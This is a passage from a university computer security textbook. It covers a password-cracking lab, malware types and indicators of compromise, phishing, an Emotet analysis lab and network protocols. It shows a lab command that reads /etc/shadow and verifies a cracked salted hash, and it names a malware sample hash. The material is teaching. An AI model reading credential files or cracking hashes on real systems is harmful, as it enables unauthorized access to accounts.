John the Ripper can also run incrementally though all the possible character combinations, but it takes much longer.
To help make these types of attacks more difficult, every hash in <code>/etc/shadow</code> is built off of a random number.
This number is called a <em>salt</em> and is stored with the hash.
This means that instead of just trying one hash for each word in the wordlist, the hash cracker must try every possible salt for every word in the wordlist, slowing things down significantly.
Modern hash crackers may use <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow tables</a> so that all of the possible hashes have already been computed.
These tables may take up terabytes of disk space, but can make cracking even complicated hashes much simpler.</p>
</div>
<div class="paragraph">
<p>Let&#8217;s use <a href="https://www.mkssoftware.com/docs/man1/openssl_passwd.1.asp">the openssl passwd command</a> to show that <code>test</code> is the actual password.
Note that the salt is stored in between the second set of <code>$</code> in the karl users line in <code>/etc/shadow</code>.
The number in between the first set of <code>$</code> is the version of the hashing algorithm being used, six in our case.
Your salt <em>will be different</em> so when you execute these commands you will need to copy and paste it accordingly.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@e6e96ae9488c:/# apt-get install openssl
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
  libssl1.1
Suggested packages:
  ca-certificates
The following NEW packages will be installed:
  libssl1.1 openssl
0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
Need to get 1941 kB of archives.
After this operation, 5411 kB of additional disk space will be used.
Do you want to continue? [Y/n] <i class="conum" data-value="1"></i><b>(1)</b>
Get:1 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 libssl1.1 amd64 1.1.1f-1ubuntu2.8 [1320 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 openssl amd64 1.1.1f-1ubuntu2.8 [620 kB]
Fetched 1941 kB in 3s (706 kB/s)
debconf: delaying package configuration, since apt-utils is not installed
Selecting previously unselected package libssl1.1:amd64.
(Reading database ... 4127 files and directories currently installed.)
Preparing to unpack .../libssl1.1_1.1.1f-1ubuntu2.8_amd64.deb ...
Unpacking libssl1.1:amd64 (1.1.1f-1ubuntu2.8) ...
Selecting previously unselected package openssl.
Preparing to unpack .../openssl_1.1.1f-1ubuntu2.8_amd64.deb ...
Unpacking openssl (1.1.1f-1ubuntu2.8) ...
Setting up libssl1.1:amd64 (1.1.1f-1ubuntu2.8) ...
debconf: unable to initialize frontend: Dialog
debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontE
nd/Dialog.pm line 76.)
debconf: falling back to frontend: Readline
debconf: unable to initialize frontend: Readline
debconf: (Can't locate Term/ReadLine.pm in @INC (you may need to install the Term::ReadLine module) (@INC contains: /etc/perl /usr/lo
cal/lib/x86_64-linux-gnu/perl/5.30.0 /usr/local/share/perl/5.30.0 /usr/lib/x86_64-linux-gnu/perl5/5.30 /usr/share/perl5 /usr/lib/x86_
64-linux-gnu/perl/5.30 /usr/share/perl/5.30 /usr/local/lib/site_perl /usr/lib/x86_64-linux-gnu/perl-base) at /usr/share/perl5/Debconf
/FrontEnd/Readline.pm line 7.)
debconf: falling back to frontend: Teletype
Setting up openssl (1.1.1f-1ubuntu2.8) ...
Processing triggers for libc-bin (2.31-0ubuntu9.2) ...
root@e6e96ae9488c:/# cat /etc/shadow <i class="conum" data-value="2"></i><b>(2)</b>
root:*:18866:0:99999:7:::
daemon:*:18866:0:99999:7:::
bin:*:18866:0:99999:7:::
sys:*:18866:0:99999:7:::
sync:*:18866:0:99999:7:::
games:*:18866:0:99999:7:::
man:*:18866:0:99999:7:::
lp:*:18866:0:99999:7:::
mail:*:18866:0:99999:7:::
news:*:18866:0:99999:7:::
uucp:*:18866:0:99999:7:::
proxy:*:18866:0:99999:7:::
www-data:*:18866:0:99999:7:::
backup:*:18866:0:99999:7:::
list:*:18866:0:99999:7:::
irc:*:18866:0:99999:7:::
gnats:*:18866:0:99999:7:::
nobody:*:18866:0:99999:7:::
_apt:*:18866:0:99999:7:::
karl:$6$A52NvzxmRoUpGksY$b8yzhXN1B4HM5ULw.QTSVB2s8yJuuC1XTtu7i8fopIy/kbIOmhB2LZ8O2oD5KdBTo1vZic00RYAupPRiqyC1d.:18871:0:99999:7::: <i class="conum" data-value="3"></i><b>(3)</b>
root@e6e96ae9488c:/# openssl passwd -6 -salt A52NvzxmRoUpGksY test <i class="conum" data-value="4"></i><b>(4)</b>
$6$A52NvzxmRoUpGksY$b8yzhXN1B4HM5ULw.QTSVB2s8yJuuC1XTtu7i8fopIy/kbIOmhB2LZ8O2oD5KdBTo1vZic00RYAupPRiqyC1d. <i class="conum" data-value="5"></i><b>(5)</b></code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Don&#8217;t forget to hit <code>y</code></td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td><code>cat</code> is a command that prints the contents of a file</td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>3</b></td>
<td>My salt is <code>A52NvzxmRoUpGksY</code> but yours will be different!</td>
</tr>
<tr>
<td><i class="conum" data-value="4"></i><b>4</b></td>
<td>We know from John the Ripper that the password is <code>test</code> if you look at the hash it should match what is in <code>/etc/shadow</code></td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Submit a screenshot with your lab showing that the output of the openssl command matches the hash in /etc/shadow</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_questions_2">2.11.2. Questions</h4>
<div class="qlist qanda">
<ol>
<li>
<p><em>What is the difference between symmetric and asymmetric encryption? Give one common use case for each.</em></p>
<p></p>
</li>
<li>
<p><em>What is a hash and what is it used for? How are hashes used in a blockchain?</em></p>
<p></p>
</li>
<li>
<p><em>What is the difference between a stream cipher and a block cipher? Give one common use case for each.</em></p>
<p></p>
</li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_malware_wip">3. Malware (WIP)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_what_is_malware">3.1. What is malware?</h3>
<div class="paragraph">
<p>Malware is a portmanteau of the words <em>malicious</em> and <em>software</em>.
The term is used to describe many different types of <em>intentionally malicious</em> programs.
Malware damages or exploits computer systems.
It often spies on, spams, or otherwise damages target or host machines.</p>
</div>
</div>
<div class="sect2">
<h3 id="_malware_targets">3.2. Malware Targets</h3>
<div class="openblock float-group">
<div class="content">
<div class="imageblock left">
<div class="content">
<img src="images/malware.png" alt="malware" width="500" height="480">
</div>
<div class="title">Figure 2. Malware Distribution by OS (Q1 2020)</div>
</div>
<div class="paragraph">
<p>The most popular target for malware is the Windows OS by quite a large margin.
This is due largely to its popularity as a desktop operating system.
The second largest target is web browsers, which afford malware a unique cross-platform reach.
The third largest target is the Android mobile operating system, which while technically Linux runs mostly on mobile phones.
Both Linux and Mac do not receive as much malware attention.
While this may be partially due to the open-source nature of Linux and the BSD kernel used by Macs, it is also partially due to the lack of popularity of each of these operating systems.
Malware is often widely distributed, meaning it can target only the most popular/possibly weakest links and still be successful.</p>
</div>
</div>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">Zero Days</div>
<div class="paragraph">
<p>Modern operating systems employ layers of security to ensure that programs do not have access to sensitive information or applications.
This typically means that for malware to be effective, it needs to elevate its privileges.
The most effective malware can perform privilege escalation without requiring user interaction.
To do this malware may rely on new/undocumented exploits or vulnerabilities.
These new exploits that have been disclosed for "zero days" are hence are referred to as <em>zero days</em>.
Zero days are incredibly powerful and may be hoarded by APTs/criminal groups or sold for millions of dollars on the Dark Web.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_types_of_malware">3.3. Types of Malware</h3>
<div class="paragraph">
<p>The definition of malware is so broad and new malware is being created daily.
This can make it difficult to classify malware.
As we go through some basic types, please keep in mind that there is significant overlap.
For example, you may encounter ransomware distributed as a virus <em>or</em> ransomware distributed as a trojan.
The fact that it is ransomware does not preclude it from being some other type of malware as well.</p>
</div>
<div class="sect3">
<h4 id="_worms_viruses_and_trojans">3.3.1. Worms, Viruses, and Trojans</h4>
<div class="paragraph">
<p>Worms are self-propagating programs that spread without user interaction.
Their code is typically stored within an independent object, such as a hidden executable file.
Worms often do not severely damage their host, as they are concerned with rapid, exponential spreading.</p>
</div>
<div class="exampleblock">
<div class="title">Example 3. Stuxnet</div>
<div class="content">
<div class="paragraph">
<p>Stuxnet was a 2010 worm that specifically targeted Iranian nuclear facilities.
The worm used an unprecedented four zero-day attacks and was designed to spread via USB flash drives and Remote Procedure Calls (RPCs).
In this way it didn&#8217;t just rely on networks to propagate.
Ultimately Stuxnet&#8217;s payload targeted the code used to program PLC devices that control motors and make them spin too fast, destroying the centrifuges.
Stuxnet also employed an impressive rootkit to cover its tracks.
Given the level of sophistication Stuxnet is believed to have been developed by the US and Israel.</p>
</div>
</div>
</div>
<div class="paragraph">
<p>Viruses typically require user interaction, such as copying and infected file from one machine to another, and store their code inside another file on a machine.
An executable file may be infected by having the virus code added a separate page that executes before the standard program code.
Viruses can be quite damaging to the host as they may take significant resources to spread locally.
The term virus is also an unfortunately overloaded one.
Due to it&#8217;s popularity it is often used by some lower-skill threat actors to refer to many different types of malware.</p>
</div>
<div class="exampleblock">
<div class="title">Example 4. Concept Virus</div>
<div class="content">
<div class="paragraph">
<p>The Concept virus was the first example of a Microsoft Word macro virus.
The virus hid itself inside Microsoft Word files and used Word&#8217;s embedded macro language to perform its replication tasks.
Viruses were later created for Excel and other programs that had sufficiently sophisticated yet ultimately insecure internal scripting languages.</p>
</div>
</div>
</div>
<div class="paragraph">
<p>A trojan is a form of malware that disguises itself as legitimate software.
It does not have to rely on a software exploit as much as it exploits users into installing, running, or giving extra privileges to the malicious code.
Trojans are the most popular kind of malware as they can be used as an attack vector for many other payloads.
The name comes from Greek mythology, where a Trojan horse was disguised as a gift and given to a besieged town.
Within the large horse were secret troops who came out in the middle of the night and opened the town gates.</p>
</div>
<div class="exampleblock">
<div class="title">Example 5. Emotet</div>
<div class="content">
<div class="paragraph">
<p>Emotet is a banking trojan from 2014 that spread through emails.
It made use of malicious links or macro-enabled documents to make the user download its code.
Emotet has been one of the most costly and destructive pieces of malware currently averaging about one million in incident remediation.
It continues to be adapted to avoid detection and make use of even more sophisticated malware.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_ransomware">3.3.2. Ransomware</h4>
<div class="imageblock right">
<div class="content">
<img src="images/wannacry.png" alt="wannacry" width="400">
</div>
</div>
<div class="paragraph">
<p>Ransomware is a type of malware that encrypts files and demands a ransom to decrypt them.
Modern ransomware uses symmetric encryption to the files quickly and then encrypts the symmetric key asymmetrically using a hard-coded public key for which the threat actor has the corresponding private key.
When the ransom is paid, typically via cryptocurrency, the threat actor can decrypt the symmetric key using their private key and the user can use the symmetric key to decrypt the files.</p>
</div>
<div class="paragraph">
<p>Ransomware is considered a data breach in the data is often exfiltrated as well.
It is also worth noting that when the ransom is paid, there is no guarantee that the threat actor will actually begin the decryption process.
Typical targets of ransomware include corporate infrastructure and health care systems although ransomware may also be spread indeterminately.
The payout of ransoms can be a large money-making enterprise so many APTs or criminal groups may employ its use.
Ransomware is considered the biggest threat to cyber stability today.</p>
</div>
</div>
<div class="sect3">
<h4 id="_spyware">3.3.3. Spyware</h4>
<div class="paragraph">
<p>Malware specifically designed for espionage/data theft is known as spyware.
Like ransomware, spyware can also have a monetary payoff for the threat actor.
Actors may use extortion to demand payment or the data will be <em>leaked</em>.
This typically means either sold on the dark web or publicly posted.
Once again, given the possibility of monetary gain, spyware is often associated with criminal groups.
APTs may use spyware as well to obtain secrets of national importance.</p>
</div>
<div class="paragraph">
<p>Customer data, trade secrets, proprietary data, and government secrets are all targets of spyware.
Even outside of governments systems, in the corporate setting, spyware is still a major threat.</p>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">Fileless Malware</div>
<div class="imageblock text-center">
<div class="content">
<img src="images/fileless.svg" alt="fileless" width="776" height="272">
</div>
</div>
<div class="paragraph">
<p>Malware is often detected by scanning storage for files that match a particular hash or by looking in files to see if they contain patterns.
Both of these detection techniques rely on the malware being stored in a file.
Fileless malware attempts to avoid detection by leaving no footprint in the file system.
This type of malware uses legitimate processes to load itself into memory, often with a registry key created to reload every time the machine is restarted.
This creates a persistent, hard-to-detect type of malware that is often used by sophisticated threat actors such as APTs and criminal groups.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_indicators_of_compromise">3.4. Indicators of Compromise</h3>
<div class="paragraph">
<p>An <em>indicator of compromise (IoC)</em> is an artifact with high confidence the indicates an intrusion.
It is a way to tell if a machine has been a victim of malware.
IoCs are publicly communicated by security professionals in an effort to help mitigate the effects of malware.</p>
</div>
<div class="dlist">
<div class="title">Common IoC Types</div>
<dl>
<dt class="hdlist1">Hash</dt>
<dd>
<p>A hash of files that are known to be malicious.
This can help in identifying trojans and worms.</p>
</dd>
<dt class="hdlist1">IP addresses</dt>
<dd>
<p>Tracking the IP addresses which malware connects to can be used to determine if a machine is infected.</p>
</dd>
<dt class="hdlist1">URLs/Domains</dt>
<dd>
<p>Tracking the URLs or domains that malware uses can also be used to determine if a machine is infected.</p>
</dd>
<dt class="hdlist1">Virus definition/signature</dt>
<dd>
<p>Executables and other files can be scanned for specific sequences of bytes which are unique to a particular virus.
In this way even if the malware is hiding within another file, it can still be detected.</p>
</dd>
</dl>
</div>
</div>
<div class="sect2">
<h3 id="_delivery_of_malware">3.5. Delivery of Malware</h3>
<div class="paragraph">
<p>Malware is often delivered through social engineering, namely convincing an actor within an organization to download and run or click on something.
It can also delivered through infiltrating the software packages something depends on, supply chain, or possibly through a software exploit on an publicly exposed service.
Some of the most common ways of spreading malware are detailed below.</p>
</div>
<div class="sect3">
<h4 id="_phishing">3.5.1. Phishing</h4>
<div class="paragraph">
<p>Phishing involves communicating with someone via a fraudulent message in an effort to make them perform and action that will harm them.
It is broken into five main categories:</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">Spear phishing</dt>
<dd>
<p>Sending phishing emails or other communications that are targeted towards a particular business or environment.
These messages may include information about the inner workings of the organization in an attempt to prove their validity.
They may also take advantage of a known, insecure practice at a particular organization.
Spear phishing is not your standard wide-net phishing attempt, but more of a focused, tailored, custom campaign.</p>
</dd>
<dt class="hdlist1">Whaling</dt>
<dd>
<p>Targeting high-ranking individuals at an organization.
Whaling is often used in conjunction with spear phishing.</p>
</dd>
<dt class="hdlist1">Smishing</dt>
<dd>
<p>Using SMS messages to phish for access.</p>
</dd>
<dt class="hdlist1">Vishing</dt>
<dd>
<p>Using voice messages to phish for access.</p>
</dd>
<dt class="hdlist1">Phishing sites</dt>
<dd>
<p>Threat actors can attempt to gain unauthorized access through information obtained from non-business related communication channel.
For example, malicious actors may know that the CEO frequents a popular sailing forum.
These actors could set up an account on the sailing forum to direct message the CEO for information.</p>
</dd>
</dl>
</div>
</div>
<div class="sect3">
<h4 id="_spam">3.5.2. SPAM</h4>
<div class="paragraph">
<p>SPAM consists of large quantities of unsolicited emails.
These emails may be malicious or they may simply be advertising.
In either case SPAM accounts for nearly 85% of all email.
It is interesting to note that sometimes the malware distributed through SPAM is actually used to send more SPAM through a victim&#8217;s machine.
The war on SPAM is constantly evolving and while many updates have been made to the way we send email, many improvements have yet to be realized.</p>
</div>
</div>
<div class="sect3">
<h4 id="_dumpster_diving">3.5.3. Dumpster Diving</h4>
<div class="paragraph">
<p>Information that can ultimately lead to the spread of malware can also be found in improperly disposed trash.
Old records or hard drives may contain corporate secrets or credentials that give someone unauthorized access.
It is important to properly dispose of sensitive information, making sure that all things that need to be destroyed are destroyed in a complete manner.</p>
</div>
</div>
<div class="sect3">
<h4 id="_shoulder_surfing">3.5.4. Shoulder Surfing</h4>
<div class="paragraph">
<p>PINs, passwords, and other data can also recovered simply by looking over someone&#8217;s shoulder.
These credentials could be the "in" that an attacker needs to spread malware.
Through the aid of optics, such a binoculars, shoulder surfing can even occur at a long distance.
Privacy screens, which limit the angle at which you can see a monitor, can be helpful in mitigating this type of attack.</p>
</div>
</div>
<div class="sect3">
<h4 id="_tailgating">3.5.5. Tailgating</h4>
<div class="paragraph">
<p>Following behind someone who is entering a secure location with a credential is known as tailgating.
Often people will even hold secure doors open for someone if they have their hands full.
It is human nature to want to help people, but you also must remember that the person behind you may have a USB key with malware ready to deploy as soon as they gain physical access to a machine in the building.</p>
</div>
</div>
<div class="sect3">
<h4 id="_impersonationidentity_theft">3.5.6. Impersonation/Identity Theft</h4>
<div class="paragraph">
<p>Often as part of a phishing campaign, a threat actor will pretend to be someone else.
This may be someone within the organization or someone with sufficient power outside the organization, such as a representative of a government oversight agency.
Attackers may also use stolen credentials to make their messages appear official, once again giving them and easy route through which to deploy malware.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_review_3">3.6. Review</h3>
<div class="sect3">
<h4 id="_labs_3">3.6.1. Labs</h4>
<div class="openblock lab">
<div class="title">Malware Analysis</div>
<div class="content">
<div class="paragraph">
<p>The website <a href="https://any.run">Any Run</a> offers free interactive malware analysis.
We will be using this site to avoid the complications of running malware in a VM.</p>
</div>
<div class="paragraph">
<p>Start by visiting <a href="https://any.run">Any Run</a> and registering for an account with your NJIT email address.
Once you have activated your account via email, follow the tutorial to learn how to analyze threats.
Use the demo-sample task provided by Any Run.
Follow the prompts and watch how the process tree changes.
Feel free to take your time, even after the time expires you will still be able to look at the running processes and analyze HTTP Requests, Connections, DNS Requests, and Threats.</p>
</div>
<div class="paragraph">
<p>For this lab we are going to look at an example of <a href="https://www.malwarebytes.com/emotet">Emotet</a>, a banking Trojan discovered in 2014.
On the left-hand side of the Any Run site, click on <em>Public tasks</em> and search for the md5 sum <code>0e106000b2ef3603477cb460f2fc1751</code>.
Choose <em>one</em> of the examples (there are three) and look through the screenshots to get an idea of how the malware is run.
It may also help to glance at the network traffic processes.</p>
</div>
<div class="paragraph">
<p>Run the VM live by clicking <em>Restart</em> in the upper right-hand corner.
Perform the actions necessary to trigger the malware, adding time as needed.
Finally open notepad on the VM, type in your name, and take a unique screenshot.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Submit a unique screenshot of your VM</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Use the Any Run tools to analyze the malware you chose.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Answer the following questions in the text box provided:</p>
</div>
<div class="qlist qanda">
<ol>
<li>
<p><em>What does this malware do to ensure that it is always running in the background?</em></p>
<p></p>
</li>
<li>
<p><em>Why is malware often put inside an archive file instead of being distributed as a simple executable?</em></p>
<p></p>
</li>
<li>
<p><em>What IP addresses does this malware attempt to connect to?</em></p>
<p></p>
</li>
<li>
<p><em>Does this malware resolve any DNS addresses? How do you know?</em></p>
<p></p>
</li>
<li>
<p><em>How could you uniquely identify this file as malware (be specific, like specific enough for a malware scanner to find it)?</em></p>
<p></p>
</li>
<li>
<p><em>What are IoCs and what are the IoCs for this malware?</em></p>
<p></p>
</li>
</ol>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_questions_3">3.6.2. Questions</h4>
<div class="qlist qanda">
<ol>
<li>
<p><em>Why might an APT choose to use fileless malware as opposed to malware that runs from a file on a machine?</em></p>
<p></p>
</li>
<li>
<p><em>What is an IoC? Give an example.</em></p>
<p></p>
</li>
<li>
<p><em>What is phishing? What are the five types of phishing? Give an example of each type.</em></p>
<p></p>
</li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_protocols">4. Protocols</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Protocols can be though of as rules that dictate communication.
A protocol may include information about the syntax used, error correction, synchronization, or any other aspect of how communication occurs in the context of that situation.
In computer security it is important to have a thorough understanding of common protocols as their weaknesses often determine how and if an attack will occur.
Protocols exist for both hardware and software and have been developed via individuals and organizations.
Early networking protocols were often developed on mailing lists using Requests for Comments (RFCs).
You may still see RFCs being crafted, referred to, or actively worked on.
<a href="https://datatracker.ietf.org/doc/html/rfc2616">Some of the earliest web protocols are detailed in RFCs.</a>
More often than not, large protocols have working groups and associations developing, such as the 802.11 group at the <a href="https://www.ieee.org/">Institute of Electrical and Electronics Engineers (IEEE)</a> which handles WiFi protocols.
These groups publish papers detailing how the protocols work.</p>
</div>
<div class="paragraph">
<p>This chapter will give a brief description of important protocols following the TCP/IP layering model.
It is important to note that some of these protocols may reach across layers to accomplish tasks.
In this case they will be grouped according to which layer they largely function within.</p>
</div>
<div class="sect2">
<h3 id="_network_access_layer">4.1. Network Access Layer</h3>
<div class="sect3">
<h4 id="_arp">4.1.1. ARP</h4>
<div class="paragraph">
<p>Address Resolution Protocol (ARP) is used on the local ethernet segment to resolve IP addresses to MAC addresses.
Since this protocol functions at the ethernet segment level, security was not a primary concern.
Unfortunately this means that ARP communications can be easily spoofed to cause a MitM scenario.
A malicious actor simply sends out several ARP packets, <em>gratuitous arp</em>, saying that traffic for a certain IP address should be sent to them.
Since the MAC to IP address table is cached in several places, it can take a long time for all the caches to invalidate and resolve an issue caused by malicious ARP frames.</p>
</div>
<div class="paragraph">
<p>There is a protocol designed to mitigate the issues with ARP.
Dynamic ARP Inspection (DAI) reaches across layers to work with the DHCP lease database and drop packets that are not using the MAC address used when a DHCP lease was granted.
While this can solve many of the issues associated with ARP it is also a good practice to use secure higher-level protocols such as HTTPS just in case.</p>
</div>
</div>
<div class="sect3">
<h4 id="_wifi">4.1.2. Wifi</h4>
<div class="paragraph">
<p>The Wifi protocols we are most concerned with are the security standards used to encrypt data.
By the nature of a wireless protocol, information sent on the network is available to anyone with an antenna.
These Wifi security standards are the only thing protecting your network traffic from being viewing by anyone within your transmitting range.
There are currently four standards:</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">WEP</dt>
<dd>
<p>Wireless Equivalent Privacy (WEP) is depreceated and should not be used.
It was developed in 1999 and uses an RC4 stream and 24-bit encryption.
Several attacks have been developed that can crack WEP within a matter of seconds.</p>
</dd>
<dt class="hdlist1">WPA</dt>
<dd>
<p>Wifi Protected Access (WPA) utilized Temporal Key Integrity Protocol (TKIP) to change the keys being used.
This 128-bit encryption method has also been cracked and the protocol should not be used.</p>
</dd>
<dt class="hdlist1">WPA2</dt>
<dd>
<p>Wifi Protected Access 2 (WPA2) makes use of AES encryption and is currently the most popular standard.
WPA2 is still considered secure.</p>
</dd>
<dt class="hdlist1">WPA3</dt>
<dd>
<p>Wifi Protected Access 3 (WPA3) was developed in 2018 and is currently considered state-of-the-art.
Many networks are beginning the transition from WPA2 to WPA3.</p>
</dd>
</dl>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_internet_layer_protocols">4.2. Internet Layer Protocols</h3>
<div class="sect3">
<h4 id="_ip">4.2.1. IP</h4>
<div class="paragraph">
<p>IP stands for internet protocol and it was devised to allow creating a network of networks.
The network of networks that uses it primarily is the Internet, although you could use IP in other scenarios as well.
IP is largely concerned with <em>routing</em> traffic across and to networks.
The protocol was first detailed by the IEEE in 1974 and comes from the Advanced Research Projects Agency Network (ARPANET) project, which created the first large, packet-switched network.</p>
</div>
<div class="paragraph">
<p>Most people are familiar with IP addresses, the unique number given to a host participating in an IP network.
Currently there are two main versions of the IP protocol, IPv4 and IPv6, and one of the major differences is in how many IP addresses are available.
IPv4 supports 32 bit addresses and IPv6 supports 128 bit addresses.
To give an idea of how big of a change that is, we have currently allocated all possible IPv4 addresses, but with IPv6 we could give an address to every grain of sand on the beaches of earth and still not run out.</p>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">IPv6 Security Implications</div>
<div class="paragraph">
<p>From a security standpoint, the way addresses are used in IPv4 vs IPv6 has big consequences.
Since there aren&#8217;t enough IPv4 addresses a typical internet user is assigned a local address that gets translated to an external IPv4 address when they route their packets through their router.
This is referred to as Network Address Translation (NAT) and is usually handled by an all-in-one device that also makes sure external entities cannot connect to the internal network.</p>
</div>
<div class="paragraph">
<p>With IPv6 addresses each host on that same <em>internal</em> network can be given an external IPv6 address.
A <em>basic</em> IPv6 router may simply pass the packets to the network without blocking connections to the internal network.
If the machines are not hardened or a firewall is not put in place/enabled the machines could be subject to attack.</p>
</div>
<div class="paragraph">
<p>As a computer security specialist it is important to test not only IPv4 connectivity, but also IPv6 to ensure that your network is configured appropriately.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_icmp">4.2.2. ICMP</h4>
<div class="paragraph">
<p>Internet Control Message Protocol (ICMP) is largely used to send messages between systems when IP doesn&#8217;t work.
For example, lets say we tried to connect to a host but our router doesn&#8217;t know how to get there.
Our router can send us an ICMP <em>Destination Unreachable</em> message to let us know that something is going wrong.
Because ICMP messages work at the network layer, we will receive this message even if there is an issue with the internet layer.</p>
</div>
<div class="paragraph">
<p>The most common use for ICMP is the <code>ping</code> command.
<code>ping</code> sends an ICMP echo request to check to see if a host is up.
By responding to the request with the data included in the request we can assume that the host is up and functioning.</p>
</div>
<div class="paragraph">
<p>ICMP is also used in the <code>traceroute</code> command.
<code>traceroute</code> incrementally increase the Time To Live (TTL) field of ICMP packets and watches for <em>TTL Exceeded</em> messages to determine what route packets are taking to get to a host.
Example <code>traceroute</code> output is shown below:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
 1  ryan.njitdm.campus.njit.edu (172.24.80.1)  0.217 ms  0.200 ms  0.252 ms
 2  ROOter.lan (192.168.2.1)  5.790 ms  5.765 ms  6.275 ms
 3  * * * <i class="conum" data-value="1"></i><b>(1)</b>
 4  B4307.NWRKNJ-LCR-21.verizon-gni.net (130.81.27.166)  19.166 ms  19.144 ms  21.097 ms
 5  * * * <i class="conum" data-value="1"></i><b>(1)</b>
 6  0.ae1.GW7.EWR6.ALTER.NET (140.222.2.227)  12.376 ms  14.634 ms 0.ae2.GW7.EWR6.ALTER.NET (140.222.2.229)  9.805 ms
 7  209.85.149.208 (209.85.149.208)  9.782 ms  10.331 ms  9.192 ms
 8  * * * <i class="conum" data-value="1"></i><b>(1)</b>
 9  dns.google (8.8.8.8)  11.313 ms  9.761 ms  9.758 ms</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Notice these routers not responding to ICMP packets</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Despite the usefulness of ICMP, ICMP packets from external sources are often ignored.
Network engineers use ICMP to troubleshoot their own networks, but it would be a security issue to allow outside parties to do the same.
As such, do not expect all external hosts to respond to pings.
They may still be up, but you&#8217;ll need to figure out <a href="https://nmap.org/book/man-host-discovery.html">another way to detect them.</a></p>
</div>
</div>
<div class="sect3">
<h4 id="_nat">4.2.3. NAT</h4>
<div class="imageblock left">
<div class="content">
<img src="images/nat.svg" alt="nat" width="500" height="192">
</div>
</div>
<div class="paragraph">
<p>Network address translation (NAT) is primarily used to allow local IP address to share a public IPv4 address.
Given the lack of IPv4 address space many devices have to share a single address.
As mentioned when discussing IPv6, NAT routers often also include security features such as a stateful firewall as the complexity of the hardware required to perform NAT is equivalent to what would be needed for a firewall.</p>
</div>
</div>
<div class="sect3">
<h4 id="_ipsec">4.2.4. IPsec</h4>
<div class="paragraph">
<p>Internet Protocol Security (IPsec) is used to set up a point-to-point encryption tunnel to secure data in transit across IP networks.
IPsec is used primarily in dedicated VPN links and makes use of three main parts: SA, ESP, and AH:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>SA stands for security association and is a channel used to set up encryption parameters and exchange keys.
This happens via UDP on port 500.</p>
</li>
<li>
<p>ESP stands for encapsulating security protocol and is used to encrypt IP headers and payloads.
It is sent using standard IP packets with the protocol field set to 50.</p>
</li>
<li>
<p>AH stands for authentication header and they can optionally be used in standard IP packets with the protocol field set to 51.
AH simply ensures that a packet hasn&#8217;t been tampered with.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_transport_layer_protocols">4.3. Transport Layer Protocols</h3>
<div class="sect3">
<h4 id="_tcp">4.3.1. TCP</h4>
<div class="paragraph">
<p>Transmission Control Protocol (TCP) is at the heart of most networks.
It provides for reliable communication via a three way hand shake, breaks large data segments into packets, ensures data integrity, and provides flow control for those packets.
This all comes at a cost of course, and this connection-oriented protocol typically has higher latency than its counterparts.
Given the complex nature of TCP is has often been targeted for attacks.
TCP stacks are constantly adapting and changing (within the parameters of the protocol) to avoid DoS and MitM attacks.<sup class="footnote">[<a id="_footnoteref_3" class="footnote" href="#_footnotedef_3" title="View footnote.">3</a>]</sup></p>
</div>
</div>
<div class="sect3">
<h4 id="_udp">4.3.2. UDP</h4>
<div class="paragraph">
<p>User Datagram Protocol (UDP) is a connectionless protocol designed for instances where TCP may have too much latency.
UDP achieves this performance boost by not having handshaking or flow control.
The result is a speedy protocol that sometimes drops datagrams.
UDP is often used as the basis for gaming or streaming protocols where the timing of the packets is more important that whether or not they all arrive.
UDP does still employ checksums so you can be sure of the integrity of any UDP packets that you do receive.</p>
</div>
</div>
<div class="sect3">
<h4 id="_common_ports_and_services">4.3.3. Common Ports and Services</h4>
<div class="paragraph">
<p>Port numbers are used in a transport layer connection to specify which service to connect to.
This allows a single host to have multiple services running on it.
Ports 0 to 1023 are <em>well-known ports</em> and typically support a commonly used service.
In most operating systems it takes administrative privileges to bind to a Well-known port and listen for connections.
